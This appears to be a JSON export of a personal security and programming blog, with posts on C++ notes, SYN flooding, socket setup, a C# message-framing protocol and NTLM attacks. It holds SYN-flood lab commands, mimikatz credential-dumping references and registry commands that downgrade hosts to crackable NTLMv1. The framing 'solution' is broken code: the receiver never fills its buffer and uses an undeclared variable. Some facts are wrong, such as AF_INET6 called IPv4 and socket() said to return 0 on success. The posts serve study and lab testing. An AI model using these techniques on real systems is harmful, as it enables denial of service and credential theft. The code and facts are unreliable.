&lt;&lt; multiple(5, 3) &lt;&lt; &quot;\\nProduct of 7.25 and 2.0: &quot; &lt;&lt; multiple(7.25, 2.0) &lt;&lt; &quot;\\n&quot;; std::string s1&#123;&quot;h1&quot;&#125;; std::string s2&#123;&quot;bye&quot;&#125;; auto result&#123;multiply(s1, s2)&#125;;&#125; 15.5 - Type Traits 15.6 - C++20 Concepts: A Deeper Look123template&lt;typename T&gt; requires Numeric&lt;T&gt;T multiply(T first, T second) &#123;return first * second;&#125; 1234template&lt;typename T&gt;T multiply(T first, T second) requires Numeric&lt;T&gt; &#123; return first * second;&#125; 15.7 - Testing C++20 Concepts with static_assert 15.8 - Creating a Custom Algorithm Chapter.16 - C++20 Modules: Large-Scale Development16.4 - Example: Transitioning to Module12import SomeModule;import SomeOtherModule; It is same as:12import SomeOtherModule;import SomeModule; 16.6 - Example: Using Module1234567891011121314151617181920212223242526272829export module welcome;import &lt;string&gt;;//export a functionexport std::string welcomeStandalone() &#123; return &quot;WelcomeStandalone function called&quot;;&#125;//exporting all items in the braces that follow exportexport &#123; std::string welcomeFromExportBlock() &#123; return &quot;welcomeFromExportBlock function called&quot;; &#125;&#125;//exporting a namespace exports all items in the namespaceexport namespace TestNamespace1 &#123; std::string welcomeFromTestNamespace1() &#123; return &quot;welcomeFromTestNamespace1 function called&quot;; &#125;&#125;//exporting an item in a namespace exports the namespace name, toonamespace TestNamespace2 &#123; export std::string welcomeFromTestNamespace2() &#123; return &quot;welcomeFromTestNamespace2 function called&quot;; &#125;&#125; Chapter.17 - Concurrent Programming; Intro to C++20 Coroutines Chapter.18 - C++20 CorroutineTHANKS FOR READING!","categories":[{"name":"Book","slug":"Book","permalink":"https://iss4cf0ng.github.io/categories/Book/"}],"tags":[{"name":"Learning","slug":"Learning","permalink":"https://iss4cf0ng.github.io/tags/Learning/"},{"name":"Code","slug":"Code","permalink":"https://iss4cf0ng.github.io/tags/Code/"},{"name":"C++","slug":"C","permalink":"https://iss4cf0ng.github.io/tags/C/"},{"name":"Book","slug":"Book","permalink":"https://iss4cf0ng.github.io/tags/Book/"},{"name":"Note","slug":"Note","permalink":"https://iss4cf0ng.github.io/tags/Note/"},{"name":"Coding","slug":"Coding","permalink":"https://iss4cf0ng.github.io/tags/Coding/"}],"keywords":[{"name":"Book","slug":"Book","permalink":"https://iss4cf0ng.github.io/categories/Book/"}]},{"title":"[Code] SYN Flooding — From Principle to Practice","slug":"2026-1-1-SynFlooding","date":"2026-01-01T12:58:39.000Z","updated":"2026-01-02T08:15:07.563Z","comments":true,"path":"2026/01/01/2026-1-1-SynFlooding/","link":"","permalink":"https://iss4cf0ng.github.io/2026/01/01/2026-1-1-SynFlooding/","excerpt":"","text":"IntroductionThis article introduces one of the most common stress-testing methods——SYN flooding——from its underlying principles to practical implementation. A hands-on flooding experiment is also included. DisclamerThe scripts provided in this article are for educational purposes and authorized stress testing only. Do NOT use them for illegal activities.Anyone who abuses this knoeledge mut take full responsibility for their actions. What Is SYNBefore understanding what SYN is, you should first understand how TCP handshaking works. Source: https://afteracademy.com/blog/what-is-a-tcp-3-way-handshake-process/ TCP is a reliable, connection-oriented protocol. Its connection establishment process is called the three-way handshake. The client sends a SYN (Synchronize) packet to the server. The server replies with a SYN+ACK (Synchronize + Acknowledgement) packet. After receiving the SYN+ACK, the client responds with an ACK packet. Once these steps are completed, a TCP connection between the client and server is successfully established. How SYN Flooding Happens.TCP was originally designed to provide reliable communication. Security considerations were not a primary concern at that time. SYN flooding exploits the initial stage of the TCP handshake. When a server receives a SYN packet, the corresponding socket enters the SYN_RECEIVED state. The server then sends a SYN+ACK packet and waits for the final ACK from the client. If 1,000 clients attempt to connect, the server must maintain 1,000 half-open connections. If millions of clients do the same, the server may be unable to handle such a large number of pending connections. This situation is commonly referred to as TCP flooding. Now, what happens if the server never receives the final ACK packet? The answer is simple: The half-open connection will eventually be terminated after a timeout(usually around 1 minute, sometimes longer). However, during this waiting period, the connection still occupies server resources. Since each listening port has a limited backlog queue, once all slots are filled, the server can no longer accept new incoming connections—even from legitimate users. A simple analogy: Imagine someone occupying a bathroom while playing on their phone.As long as they stay inside, others cannot use it.This is known as resource exhaustion. Why SYN Flooding is a headacheSYN flooding is particularly problematic because: Half-open connections consume resources for a relatively long time. IP and TCP headers can be easily spoofed. As a result, an attacker can construct SYN packets with fake source IP addresses, meaning the server will never receive the final ACK packet. Additionally, a SYN flooding attack does not necessarily require a botnet, making it easier to execute compared to other types of DDoS attacks. LabEnvironment setting up Device IP Description Ubuntu 64-bit(VM) 172.20.10.2 Target device. Windows 10 172.20.10.3 Attacker device. Tool Name Introduction LaserGunDDoS Flooding script. Stress testingAttacker:1python main.py &quot;Wi-Fi&quot; 12&gt; show 123&gt; set ip 172.20.10.2&gt; show mode&gt; set ports 22 Notice: The target port that you want to attack must be open. 1&gt; run Target:1$ netstat -ano | grep &quot;SYN_RECV&quot;Notice that the source hosts are all fake. Mitigation &amp; Modern DefensesModern operating systems implement several mechanisms to mitigate SYN flooding attacks.One common approach is SYN cookies, which allow the server to avoid allocating resourcesuntil the final ACK packet is received.Other mitigations include increasing the TCP backlog size, rate limiting incoming SYN packets,and deploying firewall or IDS/IPS rules. ConclusionThis articles describes the underlying priciples of SYN flooding. Furthermore, it demonstrates the implementations, it also provides the modern defnese of this kind of flooding.","categories":[{"name":"Code","slug":"Code","permalink":"https://iss4cf0ng.github.io/categories/Code/"}],"tags":[{"name":"Learning","slug":"Learning","permalink":"https://iss4cf0ng.github.io/tags/Learning/"},{"name":"Code","slug":"Code","permalink":"https://iss4cf0ng.github.io/tags/Code/"},{"name":"DDoS","slug":"DDoS","permalink":"https://iss4cf0ng.github.io/tags/DDoS/"},{"name":"DoS","slug":"DoS","permalink":"https://iss4cf0ng.github.io/tags/DoS/"}],"keywords":[{"name":"Code","slug":"Code","permalink":"https://iss4cf0ng.github.io/categories/Code/"}]},{"title":"[Learning] Socket Initialization.","slug":"2026-1-1-SocketInit","date":"2026-01-01T12:58:10.000Z","updated":"2026-01-02T13:19:36.102Z","comments":true,"path":"2026/01/01/2026-1-1-SocketInit/","link":"","permalink":"https://iss4cf0ng.github.io/2026/01/01/2026-1-1-SocketInit/","excerpt":"","text":"IntroductionThis article introduces how to initialize socket in different programming languages, such as C++, C# and Python on both Linux and Windows. What is socket? A network socket is a software structure within a network node of a computer network that serves as an endpoint for sending and receiving data across the network. The structure and properties of a socket are defined by an application programming interface (API) for the networking architecture. Sockets are created only during the lifetime of a process of an application running in the node.Because of the standardization of the TCP/IP protocols in the development of the Internet, the term network socket is most commonly used in the context of the Internet protocol suite, and is therefore often also referred to as Internet socket. In this context, a socket is externally identified to other hosts by its socket address, which is the triad of transport protocol, IP address, and port number.The term socket is also used for the software endpoint of node-internal inter-process communication (IPC), which often uses the same API as a network socket. —— Wikipedia …Well, this might look confusing at first.The simplest way to think about it is to imagine an abstract, invisible transmission line between two devices.Device A connects to Device B and sends information.This “invisible transmission line” is what we call a socket.Devices establish stable communication through TCP sockets. Establishment of socketC++ (Linux)Functions that you need to know: socket()1int socket(int domain, int type, int protocol); Domain: The working domain of your socket: Domain Meaning AF_INET IPv4 internetwork(Device to device). AF_INET6 IPv4 internetwork(Device to device). AF_UNIX Unix(Process to process). Type: The communication method: Type Meaning SOCK_STREAM TCP communication SOCK_DGRAM UDP datagram. Protocol: Protocol standard, usually set to 0. socket() return 0 for successed establishment, otherwise -1. connect()1int connect(int sockfd, struct sockaddr_in *server, int addr_len); sockfd: The return value of socket() server: The information about this socket.12345678910struct sockaddr_in &#123; short sin_family; //AF_INET unsigned short sin_port; //Port number. struct in_addr sin_addr; char sin_zero[8]; //Not used, must be zero.&#125;struct in_addr &#123; unsigned long s_addr; //Load with inet_pton()&#125; This function is used by the socket client. bind() 1int bind(int sockfd, struct sockaddr* addr, int addrlen); listen() 1int listen(int sockfd, int backlog); This function is used by the socket server. Completed codeserver.cpp12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152#include &lt;iostream&gt;#include &lt;cstring&gt;#include &lt;unistd.h&gt;#include &lt;arpa/inet.h&gt;int main() &#123; int server_fd = socket(AF_INET, SOCK_STREAM, 0); if (server_fd &lt; 0) &#123; perror(&quot;socket&quot;); return 1; &#125; sockaddr_in server_addr&#123;&#125;; server_addr.sin_family = AF_INET; server_addr.sin_port = htons(8080); // Port server_addr.sin_addr.s_addr = INADDR_ANY; // 0.0.0.0 if (bind(server_fd, (sockaddr*)&amp;server_addr, sizeof(server_addr)) &lt; 0) &#123; perror(&quot;bind&quot;); close(server_fd); return 1; &#125; if (listen(server_fd, 5) &lt; 0) &#123; perror(&quot;listen&quot;); close(server_fd); return 1; &#125; std::cout &lt;&lt; &quot;Server listening on port 8080...\\n&quot;; sockaddr_in client_addr&#123;&#125;; socklen_t client_len = sizeof(client_addr); int client_fd = accept(server_fd, (sockaddr*)&amp;client_addr, &amp;client_len); if (client_fd &lt; 0) &#123; perror(&quot;accept&quot;); close(server_fd); return 1; &#125; char buffer[1024] = &#123;0&#125;; read(client_fd, buffer, sizeof(buffer)); std::cout &lt;&lt; &quot;Client says: &quot; &lt;&lt; buffer &lt;&lt; std::endl; const char* reply = &quot;Hello from server&quot;; send(client_fd, reply, strlen(reply), 0); close(client_fd); close(server_fd); return 0;&#125; client.cpp123456789101112131415161718192021222324252627282930313233#include &lt;iostream&gt;#include &lt;cstring&gt;#include &lt;unistd.h&gt;#include &lt;arpa/inet.h&gt;int main() &#123; int sock = socket(AF_INET, SOCK_STREAM, 0); if (sock &lt; 0) &#123; perror(&quot;socket&quot;); return 1; &#125; sockaddr_in server_addr&#123;&#125;; server_addr.sin_family = AF_INET; server_addr.sin_port = htons(8080); inet_pton(AF_INET, &quot;127.0.0.1&quot;, &amp;server_addr.sin_addr); if (connect(sock, (sockaddr*)&amp;server_addr, sizeof(server_addr)) &lt; 0) &#123; perror(&quot;connect&quot;); close(sock); return 1; &#125; const char* message = &quot;Hello from client&quot;; send(sock, message, strlen(message), 0); char buffer[1024] = &#123;0&#125;; read(sock, buffer, sizeof(buffer)); std::cout &lt;&lt; &quot;Server reply: &quot; &lt;&lt; buffer &lt;&lt; std::endl; close(sock); return 0;&#125; Compile and execute:123456$ g++ server.cpp -o server$ g++ client.cpp -o client$ ./server$ ./client C++ (Windows)Different to Linux platform. We use WSA(Windows Sockets API)/Winsock on Windows platform. Completed codeserver.cpp123456789101112131415161718192021222324252627282930313233343536#include &lt;winsock2.h&gt;#include &lt;ws2tcpip.h&gt;#include &lt;iostream&gt;#pragma comment(lib, &quot;ws2_32.lib&quot;)int main() &#123; WSADATA wsa; WSAStartup(MAKEWORD(2,2), &amp;wsa); SOCKET serverSocket = socket(AF_INET, SOCK_STREAM, 0); sockaddr_in serverAddr&#123;&#125;; serverAddr.sin_family = AF_INET; serverAddr.sin_port = htons(8080); serverAddr.sin_addr.s_addr = INADDR_ANY; bind(serverSocket, (sockaddr*)&amp;serverAddr, sizeof(serverAddr)); listen(serverSocket, 5); std::cout &lt;&lt; &quot;Server listening on port 8080...\\n&quot;; SOCKET clientSocket = accept(serverSocket, NULL, NULL); char buffer[1024] = &#123;&#125;; recv(clientSocket, buffer, sizeof(buffer), 0); std::cout &lt;&lt; &quot;Client: &quot; &lt;&lt; buffer &lt;&lt; std::endl; const char* msg = &quot;Hello from Windows server&quot;; send(clientSocket, msg, strlen(msg), 0); closesocket(clientSocket); closesocket(serverSocket); WSACleanup(); return 0;&#125;client.cpp123456789101112131415161718192021222324252627282930#include &lt;winsock2.h&gt;#include &lt;ws2tcpip.h&gt;#include &lt;iostream&gt;#pragma comment(lib, &quot;ws2_32.lib&quot;)int main() &#123; WSADATA wsa; WSAStartup(MAKEWORD(2,2), &amp;wsa); SOCKET sock = socket(AF_INET, SOCK_STREAM, 0); sockaddr_in serverAddr&#123;&#125;; serverAddr.sin_family = AF_INET; serverAddr.sin_port = htons(8080); inet_pton(AF_INET, &quot;127.0.0.1&quot;, &amp;serverAddr.sin_addr); connect(sock, (sockaddr*)&amp;serverAddr, sizeof(serverAddr)); const char* msg = &quot;Hello from Windows client&quot;; send(sock, msg, strlen(msg), 0); char buffer[1024] = &#123;&#125;; recv(sock, buffer, sizeof(buffer), 0); std::cout &lt;&lt; &quot;Server: &quot; &lt;&lt; buffer &lt;&lt; std::endl; closesocket(sock); WSACleanup(); return 0;&#125; Cserver.cs1234567891011121314151617181920212223242526272829303132using System;using System.Net;using System.Net.Sockets;using System.Text;class Server&#123; static void Main() &#123; TcpListener listener = new TcpListener(IPAddress.Any, 8080); listener.Start(); Console.WriteLine(&quot;Server listening on port 8080...&quot;); TcpClient client = listener.AcceptTcpClient(); Console.WriteLine(&quot;Client connected&quot;); NetworkStream stream = client.GetStream(); byte[] buffer = new byte[1024]; int bytesRead = stream.Read(buffer, 0, buffer.Length); string message = Encoding.UTF8.GetString(buffer, 0, bytesRead); Console.WriteLine(&quot;Client says: &quot; + message); string reply = &quot;Hello from C# server&quot;; byte[] data = Encoding.UTF8.GetBytes(reply); stream.Write(data, 0, data.Length); client.Close(); listener.Stop(); &#125;&#125;client.cs1234567891011121314151617181920212223242526using System;using System.Net.Sockets;using System.Text;class Client&#123; static void Main() &#123; TcpClient client = new TcpClient(); client.Connect(&quot;127.0.0.1&quot;, 8080); NetworkStream stream = client.GetStream(); string message = &quot;Hello from C# client&quot;; byte[] data = Encoding.UTF8.GetBytes(message); stream.Write(data, 0, data.Length); byte[] buffer = new byte[1024]; int bytesRead = stream.Read(buffer, 0, buffer.Length); string reply = Encoding.UTF8.GetString(buffer, 0, bytesRead); Console.WriteLine(&quot;Server reply: &quot; + reply); client.Close(); &#125;&#125; Pythonserver.py12345678910111213141516171819import socketserver_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)server_socket.bind((&quot;0.0.0.0&quot;, 8080))server_socket.listen(5)print(&quot;Server listening on port 8080...&quot;)client_socket, client_addr = server_socket.accept()print(&quot;Client connected:&quot;, client_addr)data = client_socket.recv(1024)print(&quot;Client says:&quot;, data.decode())client_socket.send(b&quot;Hello from Python server&quot;)client_socket.close()server_socket.close()client.py123456789101112import socketclient_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)client_socket.connect((&quot;127.0.0.1&quot;, 8080))client_socket.send(b&quot;Hello from Python client&quot;)data = client_socket.recv(1024)print(&quot;Server reply:&quot;, data.decode())client_socket.close()","categories":[{"name":"Code","slug":"Code","permalink":"https://iss4cf0ng.github.io/categories/Code/"}],"tags":[{"name":"Code","slug":"Code","permalink":"https://iss4cf0ng.github.io/tags/Code/"},{"name":"C#","slug":"C","permalink":"https://iss4cf0ng.github.io/tags/C/"},{"name":"Network","slug":"Network","permalink":"https://iss4cf0ng.github.io/tags/Network/"},{"name":"Development","slug":"Development","permalink":"https://iss4cf0ng.github.io/tags/Development/"},{"name":"Socket","slug":"Socket","permalink":"https://iss4cf0ng.github.io/tags/Socket/"},{"name":"C++","slug":"C","permalink":"https://iss4cf0ng.github.io/tags/C/"},{"name":"Python","slug":"Python","permalink":"https://iss4cf0ng.github.io/tags/Python/"}],"keywords":[{"name":"Code","slug":"Code","permalink":"https://iss4cf0ng.github.io/categories/Code/"}]},{"title":"[Code] Solution of TCP packet sticking/coalescing (sticky packet) - Designing a protocol step by step","slug":"2026-1-1-RobustiveNetworkProtocol","date":"2026-01-01T12:57:32.000Z","updated":"2026-01-02T09:02:59.373Z","comments":true,"path":"2026/01/01/2026-1-1-RobustiveNetworkProtocol/","link":"","permalink":"https://iss4cf0ng.github.io/2026/01/01/2026-1-1-RobustiveNetworkProtocol/","excerpt":"","text":"IntroductionThis article explains how to solve a common issue in network programming—TCP packet sticking (also known as packet coalescing or sticky packets).In addition, it demonstrates how to design a custom application-layer protocol for socket communication.All examples in this article are implemented in C#. What Is Sticky Packet?If you are not familiar with socket programming, please read the following article first: Socket Initialization with different languages. Let us start with a simple receiver implementation:1234567891011121314151617181920212223242526using System;using System.Net.Sockets;using System.Text;class Client&#123; static void Main() &#123; TcpClient client = new TcpClient(); client.Connect(&quot;127.0.0.1&quot;, 8080); NetworkStream stream = client.GetStream(); string message = &quot;Hello from C# client&quot;; byte[] data = Encoding.UTF8.GetBytes(message); stream.Write(data, 0, data.Length); byte[] buffer = new byte[1024]; int bytesRead = stream.Read(buffer, 0, buffer.Length); string reply = Encoding.UTF8.GetString(buffer, 0, bytesRead); Console.WriteLine(&quot;Server reply: &quot; + reply); client.Close(); &#125;&#125;The root cause of packet sticking lies in the following line:1byte[] buffer = new byte[1024];Here, the receive buffer size is fixed at 1024 bytes.However, the size of the data sent by the server (or client—it does not matter) is not guaranteed to be exactly 1024 bytes. If the actual message size is 1025 bytes, one byte will be lost. If the actual message size is 512 bytes, it may appear safe at first. In practice, the remote host may send messages frequently and continuously.As a result, you may receive a 1024-byte buffer that actually contains two consecutive 512-byte messages. If the receiver cannot distinguish between these two messages, the handler may incorrectly treat them as a single message, which can lead to logic errors or corrupted data. This phenomenon is known as TCP packet sticking. SolutionTo solve this problem, the sender must explicitly inform the receiver of the message length. The most common and effective approach is to prepend a message header to each payload.In this section, we will design a custom application-layer protocol (OSI Layer 7) to achieve this. Fundamental DesignWe define the protocol format as follows:1| Header | Payload || Field | Description || —- | —- || Header | Constant length. || Payload | Your message. | The header structure is defined as:1| Command | Parameter | Length || Field | Size |Description || —- | —- | —- || Command | 1 byte | What the receiver should do. || Parameter | 1 byte | Parameters of the command. || Length | 4 byte | Payload’s length | Example command definitions:| Command | Parameter | Meaning || —- | —- | —- || 0 | 0 | Disconnect. || 1 | 0 | Message handler. | At this point, we have successfully defined our protocol.The next step is implementation. ImplementationWe will apply object-oriented programming (OOP) concepts in C#. Notice: Hungarian notation is used in this implementation. Designing a class 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788class clsMyProtocol&#123; public const int MAX_SIZE = 65535; public const int HEADER_SIZE = 6; private byte _nCommand = 0; public byte m_nCommand =&gt; _nCommand; private byte _nParam = 0; public byte m_nParam =&gt; _nParam; private int _nDataLength = 0; public int m_nDataLength =&gt; _nDataLength; private byte[] _abMessageData = Array.Empty&lt;byte&gt;(); public byte[] m_abMessageData =&gt; _abMessageData; private byte[] _abMoreData = Array.Empty&lt;byte&gt;(); public byte[] m_abMoreData =&gt; _abMoreData; // Constructor for parsing received buffer public clsMyProtocol(byte[] abBuffer) &#123; if (abBuffer == null || abBuffer.Length &lt; HEADER_SIZE) return; using (var ms = new MemoryStream(abBuffer)) using (var br = new BinaryReader(ms)) &#123; _nCommand = br.ReadByte(); _nParam = br.ReadByte(); _nDataLength = br.ReadInt32(); // &lt;-- little-endian by default if (abBuffer.Length - HEADER_SIZE &gt;= _nDataLength &amp;&amp; _nDataLength &gt; 0) _abMessageData = br.ReadBytes(_nDataLength); int remaining = (int)(abBuffer.Length - HEADER_SIZE - _nDataLength); if (remaining &gt; 0) _abMoreData = br.ReadBytes(remaining); &#125; &#125; // Constructor for building packets to send public clsMyProtocol(byte nCmd, byte nParam, byte[] abMsg) &#123; _nCommand = nCmd; _nParam = nParam; _abMessageData = abMsg; _nDataLength = _abMessageData.Length; &#125; public byte[] fnabGetBytes() &#123; try &#123; using (var ms = new MemoryStream()) using (var bw = new BinaryWriter(ms)) &#123; bw.Write(_nCommand); bw.Write(_nParam); bw.Write(_nDataLength); bw.Write(_abMessageData); return ms.ToArray(); &#125; &#125; catch (Exception ex) &#123; MessageBox.Show(ex.Message, &quot;fnabGetBytes()&quot;, MessageBoxButtons.OK, MessageBoxIcon.Error); return Array.Empty&lt;byte&gt;(); &#125; &#125; public (byte nCommand, byte nParam, int nLength, byte[] abMsg) fnGetMsg() =&gt; (_nCommand, _nParam, _nDataLength, _abMessageData); public static (byte nCommand, byte nParam, int nLength) fnGetHeader(byte[] abBuffer) &#123; if (abBuffer == null || abBuffer.Length &lt; HEADER_SIZE) return (0, 0, 0); byte nCommand = abBuffer[0]; byte nParam = abBuffer[1]; int nLength = BitConverter.ToInt32(abBuffer, 2); return (nCommand, nParam, nLength); &#125;&#125; Receiver handler: 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869byte[] fnabCombineBytes(byte[] abFirstBytes, int nFirstIndex, int nFirstLength, byte[] abSecondBytes, int nSecondIndex, int nSecondLength)&#123; byte[] abBytes = new byte[nFirstLength + nSecondLength]; using (MemoryStream ms = new MemoryStream()) &#123; ms.Write(abFirstBytes, nFirstIndex, nFirstLength); ms.Write(abSecondBytes, nSecondIndex, nSecondLength); abBytes = ms.ToArray(); &#125; return abBytes;&#125;void fnMsgHandler(string szMsg)&#123; //todo: Message handler.&#125;void fnHandler(Socket skt)&#123; clsMyProtocol myProto = null; int nRecvLength = 0; byte[] abStaticRecvBuffer = new byte[clsMyProtocol.MAX_SIZE]; byte[] abDynamicRecvBuffer = &#123; &#125;; do &#123; abStaticRecvBuffer = new byte[clsMyProtocol.MAX_SIZE]; nRecvLength = skt.Receive(abStaticRecvBuffer); if (nRecvLength &lt;= 0) break; else if (abDynamicRecvBuffer.Length &lt; clsMyProtocol.HEADER_SIZE) continue; else &#123; var headerInfo = clsMyProtocol.fnGetHeader(abDynamicRecvBuffer); while (abDynamicRecvBuffer.Length - clsMyProtocol.HEADER_SIZE &gt;= headerInfo.nLength) &#123; myProtocol = new clsMyProtocol(abDynamicRecvBuffer); abDynamicRecvBuffer = myProtocol.m_abMoreData; headerInfo = clsMyProtocol.fnGetHeader(abDynamicRecvBuffer); byte[] abBuffer = myProtocol.fnGetMsg().abMsg; if (myProtocol.m_nCommand == 0) &#123; if (myProtocol.m_nParam == 0) &#123; skt.Close(); &#125; &#125; else if (myProtocol.m_nCommand == 1) &#123; if (myProtocol.m_nParam == 0) &#123; string szMsg = Encoding.UTF8.GetString(abBuffer); fnMsgHandler(szMsg); &#125; &#125; &#125; &#125; &#125; while (nRecvLength &gt; 0);&#125; The sender: Important: Both sender and receiver must share the same protocol definition.1234567891011void fnSendHelloWorld(Socket skt)&#123; uint nCmd = 1; uint nParam = 0; string szMsg = &quot;Hello world!&quot;; byte[] abMsg = Encoding.UTF8.GetBytes(szMsg); clsMyProtocol myProtocol = new clsMyProtocol((byte)nCmd, (byte)nParam, abMsg); skt.Send(myProtocol.fnabGetBytes());&#125; With a clearly defined message header and proper buffer management, the original problem—TCP packet sticking—is effectively resolved. ConclusionBy designing a simple yet structured application-layer protocol, you can now establish robust and reliable socket communication, even under high-throughput or bursty network conditions.","categories":[{"name":"Code","slug":"Code","permalink":"https://iss4cf0ng.github.io/categories/Code/"}],"tags":[{"name":"Code","slug":"Code","permalink":"https://iss4cf0ng.github.io/tags/Code/"},{"name":"C#","slug":"C","permalink":"https://iss4cf0ng.github.io/tags/C/"},{"name":"Network","slug":"Network","permalink":"https://iss4cf0ng.github.io/tags/Network/"},{"name":"Programming","slug":"Programming","permalink":"https://iss4cf0ng.github.io/tags/Programming/"},{"name":"Network Programming","slug":"Network-Programming","permalink":"https://iss4cf0ng.github.io/tags/Network-Programming/"}],"keywords":[{"name":"Code","slug":"Code","permalink":"https://iss4cf0ng.github.io/categories/Code/"}]},{"title":"[Book] Attack and Denfense About Domain Penetration","slug":"DomainPenetration1","date":"2026-01-01T12:27:14.000Z","updated":"2026-01-11T05:23:44.692Z","comments":true,"path":"2026/01/01/DomainPenetration1/","link":"","permalink":"https://iss4cf0ng.github.io/2026/01/01/DomainPenetration1/","excerpt":"","text":"El libro IntroductionThis article is used to keep notes and summaries of the book “Attack and Denfense About Domain Penetration”.The content will be continuously updated as I read through the book. ReflectionThis book might be difficult for readers who are not familiar with Windows.Chapter 1 (Windows Protocols) and Chapter 2 (Fundamentals of Domain), may be tedious, abstract, and confusing for beginners. This book introduces many protocols and tools related to Active Directory penetration. It is not necessary to understand all the content in the book, such as the usage of tools or the detailed implementation of different protocols and exploitation techniques, because doing so would be time-consuming and difficult for beginners to Windows domains. My suggestion is to first understand the terminology, and then grasp the fundamentals (DON’T GO TOO DEEP!). You will master this knowledge and these skills through hands-on practice. LET’S GO! Chapter.1 - Windows Protocols1.1 - NTLM ProtocolNTLM(New Technology LAN Manager) protocol is a well-known authentication protocol introduced by Microsoft and used in Windows environments. SSPI and SSP SSPI(Security Service/Support Provider Interface) is a suite of interfaces provided by Microsoft Windows. Its functions include: Authentication Provides Session Security mechanism for other protocols. SSP(Security Service Provider) implements SSPI interface. Microsoft has implemented multiple SSPs including: NTLM SSP Kerberos SSP Digest SSP Negotiate SSP Cred SSP Schannel SSP PKU2U SSP Source: https://learn.microsoft.com/en-us/windows-server/security/windows-authentication/security-support-provider-interface-architecture LM Hash Cryptographic Algorithm Convert the user’s plaintext password to uppercase. Encode the password using the OEM character set. Pad the password with null bytes (0x00) or truncate it to exactly 14 bytes. Split the 14-byte password into two 7-byte halves. Each 7-byte half is used as a 56-bit DES key material and expanded to a 64-bit DES key by inserting parity bits. Each DES key is used to encrypt the fixed ASCII string &quot;KGS!@#$%&quot;. Concatenate the two 8-byte ciphertexts to produce the final 16-byte LM hash. Source: https://www.hackercoolmagazine.com/how-windows-authentication-works/?srsltid=AfmBOopVgjnW7fm4wUOG7pfkjyrq--TEYBE0ULgNVM02-XNCYUbeT7V1 NTLM Has Cryptography Algorithm Windows 2000 Windows XP Windows Server 2003 Windows Vista Windows 7 Windows Server 2008 Windows 8 Windows Server 2012 LM ✔ ✔ ✔ NTLM ✔ ✔ ✔ ✔ ✔ ✔ ✔ ✔ NTLM Hash Encryption Procedure Convert user’s password into hexadecimal.1P@ss1234 -&gt; Hex() = 5040535331323334 Convert ASCII into Unicode. Perform MD4 hash to unicode encoded. 1234import hashlibimport binasciiprint(&quot;NTLM_Hash: &quot; + binascii.hexlify(hashlib.new(&quot;md4&quot;, &quot;P@ss1234&quot;.encode(&quot;utf-16le&quot;)).digest()).decode(&quot;utf-8&quot;)) How Windows Store NTLM Hash:Windows stores NTLM password hashes in the Security Account Manager (SAM) database, located at C:\\Windows\\System32\\config\\SAM. The hashes are stored in encrypted form and protected by the SYSTEM key. When a user attempts to log in, the Local Security Authority Subsystem Service (lsass.exe) is responsible for authentication. The user’s plaintext password is not stored on disk. Instead, LSASS computes the NTLM hash of the provided password and compares it against the encrypted NTLM hash stored in the SAM database. The winlogon.exe process is responsible for displaying the logon interface when a user signs out, restarts, or logs on. The entered credentials are passed to LSASS for authentication processing. During authentication, credential material such as NTLM hashes, Kerberos tickets, and, in some cases, plaintext passwords may temporarily reside in LSASS memory. Tools such as mimikatz can extract these credentials by reading the memory of lsass.exe with sufficient privileges. NTLM Protocol AuthenticationNTLM Protocol based on Challenge/Response, constituted by 3 types of message: Type 1: Negotiate Type 2: Challenge Type 3: Authentication There are NTLMv1 and NTLMv2, and NTLMv2 is the most popular version. The most significant differences are, the value of Challenge and its algorithm. The common characteristics is they both use NTLM Hash. Authentication In A Workgroup Negotiation(Type 1):The client initiates contact, sending a message to the server listing its supported NTLM features and capabilities. Challenge(Type 2):The server responds, acknowledging the client’s message and sending back a unique, random 16-byte number called a “challenge”(or nunce). Response(Type 3):The clients takes the server’s challenge and encrypts it using a hash of the user’s password(not the password itself). Verification:The server receives the response and either verifies it directly or forwards the username, challenge, and response to the DC. Authentication In A Domain Negotiation:The user provides cerdentials(Username, password, domain) to the client. The client creates a NTLM hash of password , stores it in local, and sends NTLMSSP_NEGOTIATE message which is created by NTLM SSP. This Type 1 message is constituted by username only. Challenge:The server(or resource server) receives the username, then sends back a Challenge message(Type 2, aka NTLMSSP_CHALLENGE, created by NTLM SSP) containing a random 16-byte number(nonce) and server flags. NTLMv1 v.s. NTLMv2 Challenge NTLMv1: 8-byte NTLMv2: 16-byte Net-NTLM Hash Cryptography Algorithm: NTLMv1: DES NTLMv2: HMAC-MD5 How NTLMv1 create Response message: Padding 16B NTLM Hash to 21B. Divided into 3 groups, 7B for each. Use for the keys of DES algorithm. Encrypted the Challenge message from the server using DES algorithm with those 3 keys. Concate them. Format of Net-NTLMv1 Hash: 1username::hostname:LM response:NTLM response:challenge Extracting Net-NTLM v1 Hash: 1&gt; InternalMonologue.exe LmCompatibilityLevel| Value | Description || —- | —- || 0 | || 1 | || 2 | || 3 | || 4 | || 5 | | HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\lmcompatibilitylevel. Generally, lmcompatibilitylevel does not exist. Set lmcompatibilitylevel to 2: 1&gt; reg add HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\ /v lmcompatibilitylevel /t REG_DWORD /d 2 /f Security issues of NTLM ProtocolThe client creates Type 3 message(NTLMSSP_AUTH) with hash of user’s password. If the attacker doesn’t have user’s password but hash of user’s password, the attacker might perform PTH(Pass The Hash) attack. Also, Type 3 message contains Net-NTLM Hash, the attacker might performs MITM(Man In the Middle), relaying the Net-NTLM hash, this is known as NTLM Relay attack. Pass The Hash(PTH):The attacker performs PTH if the hash cannot be cracked. Passing the hash to other machines, and exploitatinng through port 135 or 445. NTLM Relay:More specifically, Net-NTLM Relay. Net-NTLM v1 Hash CrackingNet-NTLM v1 Hash can be cracked, regardless strength of password. Enable NTLMv1: 1&gt; reg add HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\ /v lmcompatibilitylevel /t REG_DWORD /d 2 /f To ensure NTLMv1 is enable: 12&gt; reg add HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\MSV1_0\\ /v NtlmMinClientSec /t REG_DWORD /d 536870912 /f&gt; reg add HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\MSV1_0\\ /v RestrictSendingNTLMTraffic /t REG_DWORD /d 0 /f 1.2 - Kerberos Protocol Operating on DC. krbtgt KDC : Key Distribution Center 